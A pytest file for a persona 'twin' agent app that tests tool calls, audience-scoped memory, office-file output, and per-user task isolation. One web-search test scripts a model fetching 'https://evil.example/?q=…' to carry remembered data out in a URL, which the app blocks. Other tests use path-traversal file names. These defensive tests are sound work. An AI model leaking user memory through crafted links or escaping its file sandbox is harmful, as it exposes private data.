"""Work mode: the agent turn (tools, deliverables, the visitor's narrower toolbox), the task store, and the web
routes, where each task is only its starter's, in the role they started it in."""

from __future__ import annotations

import datetime as dt
import io
import threading
import time
from collections.abc import Callable, Iterator, Sequence
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import httpx
import pytest
from docx import Document
from fastapi.testclient import TestClient
from langchain_core.language_models import BaseChatModel
from langchain_core.messages import AIMessage, BaseMessage, HumanMessage, SystemMessage, ToolMessage
from langchain_core.outputs import ChatGeneration, ChatResult
from openpyxl import load_workbook
from pydantic import PrivateAttr

from twin.config import AuthSettings, LLMSettings, Settings, SMTPSettings
from twin.embed import HashingEmbedder
from twin.llm import FakeLLM
from twin.persona import ledger as lg
from twin.persona.chat import index_persona
from twin.persona.items import PersonaItem
from twin.persona.office import docx_bytes, xlsx_bytes
from twin.persona.store import PersonaStore
from twin.persona.work import WorkStore, WorkTask, run_turn, work_model
from twin.web import create_app
from twin.web.jobs import PersonaProcessing
from twin.websearch import WebSearch

TODAY = dt.date(2026, 10, 20)
CSRF = {"X-Twin": "1"}
MEMBER = "member@xjjk.com"
OTHER = "other@xjjk.com"
# How long a wait for the agent may take before the test gives up. Only a liveness bound: every wait ends as soon as
# its event arrives, and a loaded machine can take ten seconds to reach a turn's first model call.
PATIENCE = 60

Step = Callable[[list[BaseMessage]], AIMessage]


def call(name: str, **args: Any) -> AIMessage:
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": f"call_{name}"}])


class Scripted(BaseChatModel):
    """A tool-calling chat model that plays ``steps`` in order, then replies "做完了。"; it keeps what it saw."""

    steps: list[Step]
    _seen: list[list[BaseMessage]] = PrivateAttr(default_factory=list)
    _tools: list[str] = PrivateAttr(default_factory=list)

    @property
    def _llm_type(self) -> str:
        return "scripted"

    def bind_tools(self, tools: Sequence[Any], **_: Any) -> Scripted:  # type: ignore[override]
        self._tools = [getattr(t, "name", None) or t.get("name") for t in tools]
        return self

    def _generate(self, messages: list[BaseMessage], *_: Any, **__: Any) -> ChatResult:
        self._seen.append(list(messages))
        message = self.steps.pop(0)(messages) if self.steps else AIMessage(content="做完了。")
        return ChatResult(generations=[ChatGeneration(message=message)])

    @property
    def system(self) -> str:
        return "\n".join(str(m.content) for m in self._seen[-1] if isinstance(m, SystemMessage))

    def tool_results(self) -> dict[str, str]:
        return {str(m.name): str(m.content) for m in self._seen[-1] if isinstance(m, ToolMessage)}


def seed(path: Path) -> None:
    with PersonaStore(path) as store:
        store.set_meta("built_at", "2026-10-19")
        store.replace_facet_items(
            "2.1", [PersonaItem(item_id="pi_test", facet_id="2.1", statement="回款优先，先收钱再扩张", evidence=[])]
        )
        store.put_ledger_entry(
            lg.LedgerEntry(
                entry_id="0123456789abcdef",
                source_id="s1",
                expression_id="s1:0001",
                meeting_date=dt.date(2026, 10, 12),
                meeting_title="周一经营会",
                kind="commitment",
                speaker="其他人1",
                quote="报价方案周四给你，没问题",
                owner="老王",
                counterpart=lg.SELF,
                what="给华澜新报价方案",
                confidence=0.9,
                extractor=lg.LEDGER_VERSION,
                created_at="now",
                updated_at="now",
            )
        )
        index_persona(store, HashingEmbedder(), Settings(db_path=path))


def step(store: WorkStore, task: WorkTask, model: Scripted, settings: Settings, text: str) -> Any:
    log: list[str] = []
    files = store.files_dir(task.task_id)
    llm = FakeLLM(lambda *_: {})
    turn = run_turn(task, text, settings, model, llm, HashingEmbedder(), files, log.append, name="张总", today=TODAY)
    return turn, log


# ── office files ──


def test_word_keeps_headings_lists_bold_and_tables() -> None:
    body = "## 本周\n- **回款**：华澜到账\n1. 下周跟进\n\n| 事项 | 负责人 |\n| --- | --- |\n| 报价 | 老王 |\n普通一段"
    document = Document(io.BytesIO(docx_bytes("周报", body)))
    paragraphs = [(p.style.name if p.style else "", p.text) for p in document.paragraphs]
    assert paragraphs == [
        ("Title", "周报"),
        ("Heading 2", "本周"),
        ("List Bullet", "回款：华澜到账"),
        ("List Number", "下周跟进"),
        ("Normal", "普通一段"),
    ]
    assert [r.bold for r in document.paragraphs[2].runs] == [True, None]
    (table,) = document.tables
    assert [[c.text for c in row.cells] for row in table.rows] == [["事项", "负责人"], ["报价", "老王"]]


def test_excel_has_a_bold_frozen_header_and_safe_unique_sheet_names() -> None:
    data = xlsx_bytes([("承诺/进展", [["事项", "截止"], ["报价", "2026-10-16"]]), ("承诺:进展", [["a"]])])
    workbook = load_workbook(io.BytesIO(data))
    assert workbook.sheetnames == ["承诺 进展", "承诺 进展 (2)"]
    sheet = workbook["承诺 进展"]
    assert [[c.value for c in row] for row in sheet.iter_rows()] == [["事项", "截止"], ["报价", "2026-10-16"]]
    assert sheet["A1"].font.bold and sheet.freeze_panes == "A2"
    with pytest.raises(ValueError):
        xlsx_bytes([])


# ── the agent turn ──


def test_the_persons_own_task_recalls_with_the_ledger_and_hands_over_office_files(tmp_path: Path) -> None:
    seed(tmp_path / "twin.db")
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("把老王的报价整理成表", MEMBER, visitor=False, audience="self")
    model = Scripted(
        steps=[
            lambda _: call("recall", query="老王 报价方案"),
            lambda _: call("write_excel", path="报价跟进", sheets=[{"name": "承诺", "rows": [["事项"], ["报价"]]}]),
            lambda _: call("write_word", path="周报.docx", title="周报", markdown="- 报价已催"),
            lambda _: call("write_file", file_path="/草稿/要点.md", content="先收钱"),
            lambda _: AIMessage(content="表和周报都写好了：报价跟进.xlsx、周报.docx。"),
        ]
    )
    turn, log = step(store, task, model, settings, "把老王的报价整理成表")
    assert {"recall", "pending_questions", "write_word", "write_excel", "write_file"} <= set(model._tools)
    assert "你就是张总本人" in model.system and "会上定了什么和谁答应了什么" in model.system
    # The same core items and voice samples chat carries, so a task sounds like the person too.
    assert "## 核心画像" in model.system and "[pi_test] 核心价值排序：回款优先，先收钱再扩张" in model.system
    assert "## 说话样本" in model.system and "不把回复写成带小标题、列表的报告" in model.system
    recalled = model.tool_results()["recall"]
    assert "给华澜新报价方案" in recalled and "回款优先" in recalled
    assert turn.content == "表和周报都写好了：报价跟进.xlsx、周报.docx。"
    assert turn.files == ["周报.docx", "报价跟进.xlsx", "草稿/要点.md"]
    assert (
        log
        == turn.steps
        == [
            "回想：老王 报价方案",
            "写 Excel：报价跟进.xlsx",
            "写 Word：周报.docx",
            "写文件：草稿/要点.md",
        ]
    )
    assert [f["path"] for f in store.files(task.task_id)] == turn.files
    assert (store.files_dir(task.task_id) / "草稿" / "要点.md").read_text(encoding="utf-8") == "先收钱"


def test_a_task_recalls_only_what_its_audience_may_use(tmp_path: Path) -> None:
    seed(tmp_path / "twin.db")
    secret = "SECRET-FAMILY-9a 孩子的学校"
    with PersonaStore(tmp_path / "twin.db") as store:
        store.replace_facet_items(
            "9.3", [PersonaItem(item_id="pi_home", facet_id="9.3", statement=secret, evidence=[])]
        )
        index_persona(store, HashingEmbedder(), Settings(db_path=tmp_path / "twin.db"))
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    seen: dict[str, tuple[str, str]] = {}
    for audience in ("self", "colleague"):
        task = store.create("回想一下", MEMBER, visitor=False, audience=audience)  # type: ignore[arg-type]
        model = Scripted(
            steps=[lambda _: call("recall", query="孩子 学校 老王 报价"), lambda _: AIMessage(content="好了")]
        )
        step(store, task, model, settings, "回想一下")
        seen[audience] = (model.tool_results()["recall"], model.system)
    # The person's own task remembers the family and the ledger; a colleague's, or a manager's, neither.
    assert "SECRET-FAMILY-9a" in seen["self"][0] and "给华澜新报价方案" in seen["self"][0]
    assert "SECRET-FAMILY-9a" not in seen["colleague"][0] and "给华澜新报价方案" not in seen["colleague"][0]
    assert "SECRET-FAMILY-9a" not in seen["colleague"][1] and "回款优先" in seen["colleague"][0]
    assert "会上定了什么和谁答应了什么" in seen["self"][1] and "会上定了什么和谁答应了什么" not in seen["colleague"][1]


def test_a_visitors_task_has_no_ledger_and_no_pending_questions(tmp_path: Path) -> None:
    seed(tmp_path / "twin.db")
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("你怎么看回款", OTHER, visitor=True)
    model = Scripted(steps=[lambda _: call("recall", query="老王 报价方案 回款")])
    step(store, task, model, settings, "你怎么看回款")
    assert "pending_questions" not in model._tools and "recall" in model._tools
    assert "不要替自己答应新的事" in model.system and "会上定了什么" not in model.system
    recalled = model.tool_results()["recall"]
    assert "回款优先" in recalled and "给华澜新报价方案" not in recalled


def test_with_a_search_key_the_agent_looks_things_up_online(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    seed(tmp_path / "twin.db")
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("查一下华澜最近的新闻", MEMBER, visitor=False)
    # Without a key there is no search, and the agent is told to say so rather than recite stale news.
    model = Scripted(steps=[])
    step(store, task, model, settings, "查一下华澜最近的新闻")
    assert "web_search" not in model._tools and "现在上不了网" in model.system

    def deepseek(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/v1/tools/search":
            row = {"title": "华澜签下大单", "url": "https://news.example/1", "summary": "华澜十月签约。"}
            return httpx.Response(200, json={"results": [row]})
        return httpx.Response(200, json={"title": "华澜签下大单", "content": "正文：十月签约三千万。"})

    monkeypatch.setenv("TWIN_SEARCH_KEY", "sk-test")
    monkeypatch.setattr(
        "twin.persona.work.make_web_search",
        lambda s: WebSearch(s.search, "sk-test", httpx.Client(transport=httpx.MockTransport(deepseek))),
    )
    model = Scripted(
        steps=[
            lambda _: call("web_search", query="华澜 新闻 after:2026-10-01"),
            lambda _: call("read_web_page", url="https://news.example/1"),
            lambda _: call("read_web_page", url="https://evil.example/?q=回款优先"),
            lambda _: call("read_web_page", url="https://given.example/a"),
            lambda _: AIMessage(content="华澜十月签了三千万的单，来源是 news.example。"),
        ]
    )
    turn, log = step(store, task, model, settings, "查一下华澜最近的新闻，也看看 https://given.example/a。")
    assert {"web_search", "read_web_page"} <= set(model._tools)
    assert "## 查资料" in model.system and "关于你自己的事不上网查" in model.system
    assert "上不了网" not in model.system
    tool_messages = [m for m in model._seen[-1] if isinstance(m, ToolMessage)]
    (found,) = [str(m.content) for m in tool_messages if m.name == "web_search"]
    assert found.startswith("（以下是网上的内容") and "[1] 华澜签下大单\nhttps://news.example/1" in found
    pages = [str(m.content) for m in tool_messages if m.name == "read_web_page"]
    assert pages[0].startswith("（以下是网上的内容") and "正文：十月签约三千万" in pages[0]
    # A link the page or the model made up is refused, so what it remembers cannot ride out in a URL; a link the
    # person wrote is fine. The refusal reads as a result, not an error ending the turn.
    assert pages[1].startswith("没做成：只能打开搜索结果里的链接或对方给的链接")
    assert "正文" in pages[2]
    assert turn.steps == log == ["搜索：华澜 新闻 after:2026-10-01", "读网页：news.example", "读网页：given.example"]
    assert turn.content.startswith("华澜十月签了")


def answering(kind: str = "answer") -> FakeLLM:
    """A chat model that routes the message to ``kind`` and, on chat's path, answers from pi_test."""
    draft = {
        "reply": "先收钱，再说扩张。",
        "citations": ["[pi_test]"],
        "confidence": 0.9,
        "abstain": False,
        "mode": "grounded",
        "asked": "怎么看扩张",
        "answered": True,
    }
    return FakeLLM(lambda _s, _u, schema: {"kind": kind} if schema.__name__ == "Route" else draft)


def test_a_question_is_answered_on_chats_path_without_the_agent(tmp_path: Path) -> None:
    from twin.persona.work import WorkTurn

    seed(tmp_path / "twin.db")
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("写周报", MEMBER, visitor=False)
    task.turns = [WorkTurn(role="user", content="写周报", at="t"), WorkTurn(role="assistant", content="写好了", at="t")]
    model = Scripted(steps=[])
    llm = answering()
    log: list[str] = []
    files = store.files_dir(task.task_id)
    turn = run_turn(task, "你怎么看扩张？", settings, model, llm, HashingEmbedder(), files, log.append, name="张总")
    assert model._seen == [] and log == ["直接回答"] and turn.steps == []
    assert turn.content == "先收钱，再说扩张。" and turn.citations == ["pi_test"] and turn.files == []
    route_call = next(user for name, _, user in llm.calls if name == "Route")
    assert "张总：写好了" in route_call and "现在这句话：你怎么看扩张？" in route_call
    # Chat saw the whole conversation, as it would in chat.
    _, _, chat_user = next(c for c in llm.calls if c[0] == "ChatDraft")
    assert "对方：写周报" in chat_user and "你：写好了" in chat_user

    # Something to make goes to the agent, which sees the person's voice.
    made = run_turn(
        task, "整理成表", settings, model, answering("task"), HashingEmbedder(), files, log.append, name="张总"
    )
    assert made.content == "做完了。" and len(model._seen) == 1 and made.citations == []

    # Asking for what is online goes to the agent, which can search, even as a follow-up the router would answer.
    for text in ("结合互联网资料呢", "网上怎么说？", "查查最新的新闻"):
        llm = answering()
        online = run_turn(task, text, settings, model, llm, HashingEmbedder(), files, log.append, name="张总")
        assert online.citations == [] and not any(name == "Route" for name, _, _ in llm.calls)
    assert len(model._seen) == 4


def test_files_stay_inside_the_task_directory(tmp_path: Path) -> None:
    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("写", None, visitor=False)
    model = Scripted(steps=[lambda _: call("write_word", path="../../逃出去", title="", markdown="x")])
    turn, _ = step(store, task, model, settings, "写")
    assert model.tool_results()["write_word"] == "没做成：文件只能写在工作目录里"
    assert turn.files == [] and not list(tmp_path.glob("*.docx"))
    assert store.file(task.task_id, "../task.json") is None


def test_a_continued_task_sees_its_earlier_turns(tmp_path: Path) -> None:
    from twin.persona.work import WorkTurn

    settings = Settings(db_path=tmp_path / "twin.db")
    store = WorkStore(settings.db_path)
    task = store.create("起个提纲", None, visitor=False)
    task.turns = [WorkTurn(role="user", content="起个提纲", at="t"), WorkTurn(role="assistant", content="好", at="t")]
    model = Scripted(steps=[])
    step(store, task, model, settings, "再加一节")
    texts = [str(m.content) for m in model._seen[0] if not isinstance(m, SystemMessage)]
    assert texts == ["起个提纲", "好", "再加一节"]


def test_the_cli_model_cannot_drive_tools() -> None:
    with pytest.raises(ValueError, match="claude_cli 不支持"):
        work_model(LLMSettings(provider="claude_cli"))


# ── web ──


def wait_idle(client: TestClient, task_id: str, headers: dict[str, str] | None = None) -> dict[str, Any]:
    deadline = time.monotonic() + PATIENCE
    while time.monotonic() < deadline:
        task: dict[str, Any] = client.get(f"/api/persona/work/{task_id}", headers=headers).json()
        if task["status"] != "running":
            return task
        threading.Event().wait(0.02)
    raise AssertionError("the turn never finished")


@pytest.fixture
def local(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[tuple[TestClient, list[Scripted]]]:
    monkeypatch.setattr(PersonaProcessing, "queue", lambda _: None)
    settings = Settings(target_name="张总", db_path=tmp_path / "twin.db")
    models: list[Scripted] = []
    app = create_app(
        settings,
        llm_factory=lambda: FakeLLM(lambda *_: {}),
        embedder_factory=HashingEmbedder,
        work_model_factory=lambda: models[0],
    )
    with TestClient(app, base_url="http://127.0.0.1", headers=CSRF) as client:
        yield client, models


def test_a_task_runs_in_the_background_and_its_files_download(local: tuple[TestClient, list[Scripted]]) -> None:
    client, models = local
    models.append(
        Scripted(
            steps=[
                lambda _: call("write_word", path="周报", title="周报", markdown="本周回款"),
                lambda _: AIMessage(content="周报写好了。"),
                lambda _: AIMessage(content="改好了。"),
            ]
        )
    )
    assert client.get("/api/persona/work").json() == {"tasks": []}
    assert client.post("/api/persona/work", json={"text": "   "}).status_code == 400
    started = client.post("/api/persona/work", json={"text": "写本周周报"})
    assert started.status_code == 202
    task_id = started.json()["task"]["task_id"]
    task = wait_idle(client, task_id)
    assert task["status"] == "idle" and task["title"] == "写本周周报"
    assert [(t["role"], t["content"]) for t in task["turns"]] == [("user", "写本周周报"), ("assistant", "周报写好了。")]
    assert task["turns"][1]["files"] == ["周报.docx"] and [f["path"] for f in task["files"]] == ["周报.docx"]
    download = client.get(f"/api/persona/work/{task_id}/files/周报.docx")
    assert download.status_code == 200 and Document(io.BytesIO(download.content)).paragraphs[0].text == "周报"
    assert client.get(f"/api/persona/work/{task_id}/files/../task.json").status_code == 404

    assert client.post("/api/persona/work", json={"text": "加一句", "task_id": task_id}).status_code == 202
    again = wait_idle(client, task_id)
    assert [t["content"] for t in again["turns"]] == ["写本周周报", "周报写好了。", "加一句", "改好了。"]
    (listed,) = client.get("/api/persona/work").json()["tasks"]
    assert listed["task_id"] == task_id and listed["turns"] == 4

    assert client.delete(f"/api/persona/work/{task_id}").json() == {"deleted": True}
    assert client.get(f"/api/persona/work/{task_id}").status_code == 404
    assert client.post("/api/persona/work", json={"text": "x", "task_id": "w_000000000000"}).status_code == 404


def test_an_answered_turn_shows_what_it_rests_on(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(PersonaProcessing, "queue", lambda _: None)
    settings = Settings(target_name="张总", db_path=tmp_path / "twin.db")
    seed(settings.db_path)
    model = Scripted(steps=[])
    app = create_app(
        settings, llm_factory=answering, embedder_factory=HashingEmbedder, work_model_factory=lambda: model
    )
    with TestClient(app, base_url="http://127.0.0.1", headers=CSRF) as client:
        task_id = client.post("/api/persona/work", json={"text": "你怎么看扩张？"}).json()["task"]["task_id"]
        task = wait_idle(client, task_id)
    question, answer = task["turns"]
    assert "cited" not in question and model._seen == []
    assert answer["content"] == "先收钱，再说扩张。" and answer["steps"] == []
    assert answer["cited"] == [
        {"id": "pi_test", "kind": "item", "facet": "核心价值排序", "text": "回款优先，先收钱再扩张"}
    ]


class Hold:
    """A step that waits for the test to let it go, after telling it the model call has started."""

    def __init__(self, reply: AIMessage) -> None:
        self.entered, self.release, self.reply = threading.Event(), threading.Event(), reply

    def __call__(self, _: list[BaseMessage]) -> AIMessage:
        self.entered.set()
        assert self.release.wait(PATIENCE)
        return self.reply


def start(client: TestClient, text: str, hold: Hold) -> str:
    task_id: str = client.post("/api/persona/work", json={"text": text}).json()["task"]["task_id"]
    assert hold.entered.wait(PATIENCE)
    return task_id


def test_a_message_while_it_runs_reaches_the_agent_at_its_next_step(local: tuple[TestClient, list[Scripted]]) -> None:
    client, models = local
    hold = Hold(AIMessage(content="周报写好了。"))

    def heard(messages: list[BaseMessage]) -> AIMessage:
        assert [str(m.content) for m in messages if isinstance(m, HumanMessage)] == ["写周报", "顺便列个待办"]
        return AIMessage(content="周报写好了，待办也列了。")

    models.append(Scripted(steps=[hold, heard]))
    task_id = start(client, "写周报", hold)
    running = client.get(f"/api/persona/work/{task_id}").json()
    assert running["status"] == "running" and running["job_id"] and not running["stopping"]
    steered = client.post("/api/persona/work", json={"text": "顺便列个待办", "task_id": task_id})
    assert steered.status_code == 202 and steered.json()["steered"]
    shown = client.get(f"/api/persona/work/{task_id}").json()
    assert [t["content"] for t in shown["turns"]] == ["写周报", "顺便列个待办"] and shown["status"] == "running"
    assert client.delete(f"/api/persona/work/{task_id}").status_code == 409
    hold.release.set()
    task = wait_idle(client, task_id)
    assert [(t["role"], t["content"]) for t in task["turns"]] == [
        ("user", "写周报"),
        ("user", "顺便列个待办"),
        ("assistant", "周报写好了，待办也列了。"),
    ]
    assert task["turns"][-1]["steps"] == ["看到新消息：顺便列个待办"]


def test_a_message_the_turn_never_read_gets_a_turn_of_its_own(
    local: tuple[TestClient, list[Scripted]], monkeypatch: pytest.MonkeyPatch
) -> None:
    from twin.persona.work import WorkTurn

    client, models = local
    models.append(Scripted(steps=[]))
    entered, release = threading.Event(), threading.Event()
    seen: list[tuple[list[str], str]] = []

    def run_turn(task: WorkTask, text: str, *_: Any, **__: Any) -> WorkTurn:
        seen.append(([t.content for t in task.turns], text))
        if len(seen) == 1:  # finishes without looking at its messages again
            entered.set()
            assert release.wait(PATIENCE)
        return WorkTurn(role="assistant", content=f"答：{text}", at="t")

    monkeypatch.setattr("twin.web.work.run_turn", run_turn)
    task_id = client.post("/api/persona/work", json={"text": "第一件"}).json()["task"]["task_id"]
    assert entered.wait(PATIENCE)
    assert client.post("/api/persona/work", json={"text": "第二件", "task_id": task_id}).json()["steered"]
    release.set()
    task = wait_idle(client, task_id)
    assert [t["content"] for t in task["turns"]] == ["第一件", "答：第一件", "第二件", "答：第二件"]
    assert seen == [([], "第一件"), (["第一件", "答：第一件"], "第二件")]


def test_a_stop_ends_the_turn_at_its_next_step_and_keeps_what_it_wrote(
    local: tuple[TestClient, list[Scripted]],
) -> None:
    client, models = local
    hold = Hold(call("write_word", path="半成品", title="", markdown="写到一半"))
    models.append(Scripted(steps=[hold]))
    task_id = start(client, "写方案", hold)
    assert client.post(f"/api/persona/work/{task_id}/stop").json() == {"stopping": True}
    assert client.get(f"/api/persona/work/{task_id}").json()["stopping"]
    hold.release.set()
    task = wait_idle(client, task_id)
    assert task["turns"][-1]["content"] == "好，先停在这里。" and task["turns"][-1]["files"] == ["半成品.docx"]
    assert len(models[0]._seen) == 1  # no model call after the stop
    assert client.post(f"/api/persona/work/{task_id}/stop").status_code == 409
    models[0].steps.append(lambda _: AIMessage(content="接着来。"))
    assert client.post("/api/persona/work", json={"text": "继续", "task_id": task_id}).json()["steered"] is False
    assert wait_idle(client, task_id)["turns"][-1]["content"] == "接着来。"


def test_a_failed_turn_is_marked_and_the_task_can_go_on(local: tuple[TestClient, list[Scripted]]) -> None:
    client, models = local

    def broken(_: list[BaseMessage]) -> AIMessage:
        raise RuntimeError("upstream exploded with a secret prompt")

    models.append(Scripted(steps=[broken, lambda _: AIMessage(content="这次好了。")]))
    task_id = client.post("/api/persona/work", json={"text": "做"}).json()["task"]["task_id"]
    failed = wait_idle(client, task_id)
    assert failed["status"] == "failed" and "secret" not in failed["error"]
    assert client.post("/api/persona/work", json={"text": "再试", "task_id": task_id}).status_code == 202
    assert wait_idle(client, task_id)["turns"][-1]["content"] == "这次好了。"


def test_without_a_tool_calling_model_work_mode_says_so(tmp_path: Path) -> None:
    settings = Settings(db_path=tmp_path / "twin.db", llm=LLMSettings(provider="claude_cli"))
    app = create_app(settings, llm_factory=lambda: FakeLLM(lambda *_: {}), embedder_factory=HashingEmbedder)
    with TestClient(app, base_url="http://127.0.0.1", headers=CSRF) as client:
        answer = client.post("/api/persona/work", json={"text": "写周报"})
        assert answer.status_code == 503 and "claude_cli 不支持" in answer.json()["detail"]
        assert client.get("/api/persona/work").json() == {"tasks": []}


@pytest.fixture
def signed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[tuple[TestClient, list[Scripted]]]:
    monkeypatch.setenv("TWIN_SMTP_PASSWORD", "test-only")
    monkeypatch.setattr(PersonaProcessing, "queue", lambda _: None)
    sender = MagicMock()
    monkeypatch.setattr("twin.web.auth.send_code", sender)
    settings = Settings(
        db_path=tmp_path / "twin.db",
        auth=AuthSettings(
            enabled=True, smtp=SMTPSettings(host="smtp.example.com", username="test", from_address="t@example.com")
        ),
    )
    models: list[Scripted] = []
    app = create_app(
        settings,
        llm_factory=lambda: FakeLLM(lambda *_: {}),
        embedder_factory=HashingEmbedder,
        work_model_factory=lambda: models[0],
    )
    with TestClient(app, base_url="http://localhost") as client:
        client.app.state.sender = sender  # type: ignore[attr-defined]
        yield client, models


def login(client: TestClient, email: str) -> str:
    client.post("/api/auth/request", json={"email": email}, headers=CSRF)
    code = str(client.app.state.sender.call_args.args[2])  # type: ignore[attr-defined]
    assert client.post("/api/auth/verify", json={"email": email, "code": code}, headers=CSRF).status_code == 200
    return str(client.cookies["twin_session"])


def test_a_visitor_works_with_a_public_twin_and_sees_only_their_own_tasks(
    signed: tuple[TestClient, list[Scripted]], tmp_path: Path
) -> None:
    client, models = signed
    model = Scripted(
        steps=[
            lambda _: call("write_word", path="私事", title="", markdown="本人的"),
            lambda _: AIMessage(content="写好了。"),
            lambda _: call("write_word", path="访客", title="", markdown="访客的"),
            lambda _: AIMessage(content="给你写好了。"),
        ]
    )
    models.append(model)
    member = login(client, MEMBER)
    persona = client.post("/api/personas", json={"name": "测试分身"}, headers=CSRF).json()["id"]
    seed(tmp_path / "personas" / persona / "twin.db")
    # 张总 is the person this twin is made for, who has taken it and said it is all right.
    assert client.put(f"/api/personas/{persona}/claim", json={"claim": MEMBER}, headers=CSRF).status_code == 200
    assert [p["mine"] for p in client.get("/api/personas").json()] == [True]
    assert client.post(f"/api/personas/{persona}/approve", json={"public": True}, headers=CSRF).status_code == 200
    headers = {**CSRF, "X-Twin-Persona": persona}
    own = client.post("/api/persona/work", json={"text": "写私事"}, headers=headers).json()["task"]["task_id"]
    assert wait_idle(client, own, headers)["status"] == "idle"
    assert "pending_questions" in model._tools

    login(client, OTHER)
    assert client.get("/api/persona/work", headers=headers).json() == {"tasks": []}
    assert client.get(f"/api/persona/work/{own}", headers=headers).status_code == 404
    assert client.get(f"/api/persona/work/{own}/files/私事.docx", headers=headers).status_code == 404
    assert client.delete(f"/api/persona/work/{own}", headers=headers).status_code == 404
    assert client.post("/api/persona/work", json={"text": "接着写", "task_id": own}, headers=headers).status_code == 404
    started = client.post("/api/persona/work", json={"text": "帮我写点东西"}, headers=headers)
    assert started.status_code == 202
    theirs = started.json()["task"]["task_id"]
    task = wait_idle(client, theirs, headers)
    assert task["visitor"] and task["by"] == OTHER and task["files"][0]["path"] == "访客.docx"
    assert "pending_questions" not in model._tools and "不要替自己答应新的事" in model.system
    assert client.get(f"/api/persona/work/{theirs}/files/访客.docx", headers=headers).status_code == 200
    # Visitors still never reach the person's own pages.
    assert client.get("/api/persona/followups", headers=headers).status_code == 403

    client.cookies.set("twin_session", member)
    assert [t["task_id"] for t in client.get("/api/persona/work", headers=headers).json()["tasks"]] == [own]
    assert client.get(f"/api/persona/work/{theirs}", headers=headers).status_code == 404
